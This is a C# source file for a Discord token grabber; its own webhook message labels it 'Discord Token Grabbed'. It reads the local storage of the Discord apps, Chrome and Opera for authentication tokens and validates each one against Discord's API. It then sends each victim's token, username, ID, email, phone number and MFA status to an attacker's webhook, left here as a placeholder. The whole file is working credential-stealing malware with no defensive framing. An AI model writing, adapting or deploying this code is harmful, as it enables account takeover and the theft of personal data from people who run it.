using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Newtonsoft.Json;

class Program
{
   //weebhook here
    const string WEBHOOK_URL = "YOUR_WEBHOOK_HERE";

    // Discord token regex
    static readonly Regex tokenRegex = new Regex(@"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}", RegexOptions.Compiled);

    static async Task Main()
    {
        Console.OutputEncoding = Encoding.UTF8;

        var tokens = new HashSet<string>();

        
        string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

        var paths = new Dictionary<string, string>()
        {
            {"Discord", Path.Combine(roaming, "discord")},
            {"Discord Canary", Path.Combine(roaming, "discordcanary")},
            {"Discord PTB", Path.Combine(roaming, "discordptb")},
            {"Chrome", Path.Combine(local, "Google", "Chrome", "User Data", "Default")},
            {"Opera", Path.Combine(roaming, "Opera Software", "Opera Stable")},
           
        };

        foreach (var pair in paths)
        {
            if (Directory.Exists(pair.Value))
            {
                var foundTokens = GetTokensFromPath(pair.Value);
                foreach (var t in foundTokens)
                    tokens.Add(t);
            }
        }

        Console.WriteLine($"Total Token: {tokens.Count}");

        foreach (var token in tokens)
        {
            var userInfo = await GetDiscordUserInfo(token);
            if (userInfo != null)
            {
                Console.WriteLine($"User: {userInfo.username}#{userInfo.discriminator} | ID: {userInfo.id}");
                await SendToWebhook(userInfo, token);
            }
        }

        Console.WriteLine("Done Bro");
    }

    static List<string> GetTokensFromPath(string path)
    {
        var tokens = new List<string>();

        try
        {
            var levelDbPath = Path.Combine(path, "Local Storage", "leveldb");
            if (!Directory.Exists(levelDbPath))
                return tokens;

            var files = Directory.GetFiles(levelDbPath, "*.*", SearchOption.AllDirectories);
            foreach (var file in files)
            {
                if (file.EndsWith(".log") || file.EndsWith(".ldb"))
                {
                    string[] lines = File.ReadAllLines(file);
                    foreach (var line in lines)
                    {
                        foreach (Match m in tokenRegex.Matches(line))
                        {
                            if (!tokens.Contains(m.Value))
                                tokens.Add(m.Value);
                        }
                    }
                }
            }
        }
        catch { }

        return tokens;
    }

    class DiscordUser
    {
        public string id { get; set; }
        public string username { get; set; }
        public string discriminator { get; set; }
        public string email { get; set; }
        public bool verified { get; set; }
        public bool mfa_enabled { get; set; }
        public string phone { get; set; }
        
    }


    //discord api

    static async Task<DiscordUser?> GetDiscordUserInfo(string token)
    {
        try
        {
            var request = (HttpWebRequest)WebRequest.Create("https://discord.com/api/v9/users/@me");
            request.Method = "GET";
            request.Headers.Add("Authorization", token);
            request.UserAgent = "Mozilla/5.0";

            using var response = await request.GetResponseAsync();
            using var stream = response.GetResponseStream();
            using var reader = new StreamReader(stream);

            string json = await reader.ReadToEndAsync();
            var user = JsonConvert.DeserializeObject<DiscordUser>(json);
            return user;
        }
        catch
        {
            return null;
        }
    }

    static async Task SendToWebhook(DiscordUser user, string token)
    {
        try
        {
            var data = new
            {
                content = $"**Discord Token Grabbed! Devlop by Rafi**\n" +
                          $"User: {user.username}#{user.discriminator}\n" +
                          $"ID: {user.id}\n" +
                          $"Email: {(string.IsNullOrEmpty(user.email) ? "(No Email)" : user.email)}\n" +
                          $"Phone: {(string.IsNullOrEmpty(user.phone) ? "(No Phone)" : user.phone)}\n" +
                          $"Verified: {user.verified}\n" +
                          $"MFA: {user.mfa_enabled}\n" +
                          $"Token: ||{token}||"
            };

            string json = JsonConvert.SerializeObject(data);

            var request = (HttpWebRequest)WebRequest.Create(WEBHOOK_URL);
            request.Method = "POST";
            request.ContentType = "application/json";

            using (var stream = await request.GetRequestStreamAsync())
            {
                byte[] content = Encoding.UTF8.GetBytes(json);
                await stream.WriteAsync(content, 0, content.Length);
            }

            using var response = await request.GetResponseAsync();
        }
        catch (Exception ex)
        {
            Console.WriteLine("Webhook send done : " + ex.Message);
        }
    }
}
